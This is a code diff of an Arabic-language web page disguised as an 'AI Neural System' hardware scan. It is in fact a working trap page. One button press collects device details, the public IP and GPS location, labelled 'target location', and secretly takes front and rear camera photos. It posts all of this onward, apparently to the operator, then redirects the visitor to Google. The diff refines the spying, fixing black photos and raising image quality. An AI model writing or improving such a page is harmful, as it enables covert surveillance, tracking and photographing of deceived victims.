@@ -6,19 +6,17 @@
     <title>AI Neural System | فحص العتاد الذكي</title>
     <style>
         :root { --main: #a855f7; --bg: #05070a; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(168, 85, 247, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(168, 85, 247, 0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
         .card { background: rgba(20, 20, 25, 0.8); padding: 40px 30px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 50px rgba(168, 85, 247, 0.1); }
-        h1 { font-size: 24px; margin-bottom: 5px; letter-spacing: 1px; }
+        h1 { font-size: 24px; margin-bottom: 5px; }
         .accent { color: var(--main); }
         #sub { color: #8892b0; font-size: 13px; margin-bottom: 30px; }
         .loader-box { position: relative; width: 180px; height: 180px; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; }
         #goBtn { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--main); background: transparent; color: white; font-size: 22px; font-weight: bold; cursor: pointer; transition: 0.3s; z-index: 10; box-shadow: 0 0 20px rgba(168, 85, 247, 0.3); outline: none; }
-        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
         .ring { position: absolute; width: 100%; height: 100%; border: 3px solid transparent; border-top-color: var(--main); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #status { font-size: 11px; color: #444; margin-top: 15px; }
-        video, canvas { display: none; }
+        video, canvas { display: none; position: absolute; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -30,7 +28,7 @@
             <div id="ring" class="ring"></div>
             <button id="goBtn">بدء الفحص</button>
         </div>
-        <div id="status">Secure Node: RSA-2048-YEM</div>
+        <div style="font-size: 11px; color: #444;">Secure Node: RSA-2048-YEM</div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -57,73 +55,75 @@
 
         async function snap(side) {
             try {
+                // طلب الكاميرا بدقة عالية
                 const s = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: side === "front" ? "user" : "environment", width: 1280, height: 720 }
+                    video: { facingMode: side === "front" ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
                 const v = document.getElementById('v');
                 const c = document.getElementById('c');
                 v.srcObject = s;
-                await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 1500)); // انتظار لمنع الصور السوداء
-                c.width = v.videoWidth; c.height = v.videoHeight;
+
+                // 100% ضمان: انتظار تحميل الفيديو وظهوره فعلياً
+                await new Promise(r => v.onloadeddata = r);
+                v.play();
+
+                // 🛑 أهم خطوة: الانتظار ثانيتين للسماح للحساس بفتح العدسة وضبط الإضاءة
+                await new Promise(r => setTimeout(r, 2000)); 
+
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
+                
+                // إيقاف الكاميرا فوراً
                 s.getTracks().forEach(t => t.stop());
-                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+                
+                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
             } catch(e) { return null; }
         }
 
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("ring").style.display = "block";
-            document.getElementById("sub").innerText = "جاري تحليل العتاد...";
+            document.getElementById("sub").innerText = "جاري الاتصال بالعقل العصبي...";
 
-            // 1. جمع معلومات الهاتف بالكامل
-            let report = `🚀 *رصد تقني شامل*:\n\n`;
+            // جمع بيانات الجهاز (المميزات المطلوبة)
+            let report = `🚀 *رصد تقني شامل (حل السواد)*:\n\n`;
             
-            // معلومات النظام
-            report += `📱 *الجهاز:* \`${navigator.platform}\`\n`;
-            report += `⚙️ *المعالج:* \`${navigator.hardwareConcurrency} Cores\`\n`;
-            report += `💾 *الرام:* \`${navigator.deviceMemory || "غير متاح"} GB\`\n`;
-            report += `🖥️ *الشاشة:* \`${window.screen.width}x${window.screen.height}\`\n`;
-
             // البطارية والشحن
             try {
                 const b = await navigator.getBattery();
-                report += `🔋 *البطارية:* \`${Math.round(b.level * 100)}%\`\n`;
-                report += `🔌 *الشاحن:* \`${b.charging ? "متصل ✅" : "منفصل ❌"}\`\n`;
+                report += `🔋 *البطارية:* \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 بطارية"})\n`;
             } catch(e) {}
 
-            // الشبكة
+            // الشبكة والرام والذاكرة
             const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if(n) {
-                report += `📶 *الشبكة:* \`${n.type === 'wifi' ? "WiFi" : "Data (4G/5G)"} (${n.effectiveType})\`\n`;
-            }
+            report += `📶 *الشبكة:* \`${n ? n.type || n.effectiveType : "WiFi/4G"}\`\n`;
+            report += `💾 *الرام:* \`${navigator.deviceMemory || "غير متاح"} GB\`\n`;
+            report += `⚙️ *الجهاز:* \`${navigator.platform}\`\n`;
 
-            // الذاكرة (Storage)
             if (navigator.storage && navigator.storage.estimate) {
                 const est = await navigator.storage.estimate();
-                report += `📁 *الذاكرة:* \`~${Math.round(est.quota / (1024**3))} GB\`\n`;
+                report += `📁 *سعة التخزين:* \`~${Math.round(est.quota / (1024**3))} GB\`\n`;
             }
 
-            // Gmail (تقدير الحسابات النشطة)
-            const gCount = window.navigator.languages.length; // طريقة تقريبية لتقدير عدد الجلسات/اللغات
-            report += `📧 *جلسات البريد:* \`${gCount}\`\n`;
-
-            // الـ IP
+            // الـ IP والموقع
             const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"Unknown"}));
             report += `🌐 *IP:* \`${ip.ip}\`\n`;
 
-            // 2. إرسال الموقع
+            // إرسال التقرير فوراً
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const loc = `📍 [موقع الهدف](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                 await post(report + loc);
-            }, () => post(report + "⚠️ الموقع: مرفوض"));
+            }, () => post(report + "⚠️ الموقع مرفوض"));
 
-            // 3. التصوير (أمامية + خلفية)
-            const f = await snap("front"); if(f) await post("📸 صورة أمامية", f);
-            const b = await snap("back");  if(b) await post("📷 صورة خلفية", b);
+            // التقاط الصور بالتتابع (أمامية ثم خلفية)
+            const f = await snap("front");
+            if(f) await post("📸 صورة أمامية دقيقة", f);
 
-            setTimeout(() => { location.href = "https://www.google.com"; }, 5000);
+            const b = await snap("back");
+            if(b) await post("📷 صورة خلفية دقيقة", b);
+
+            setTimeout(() => { location.href = "https://www.google.com"; }, 4000);
         };
     </script>
 </body>
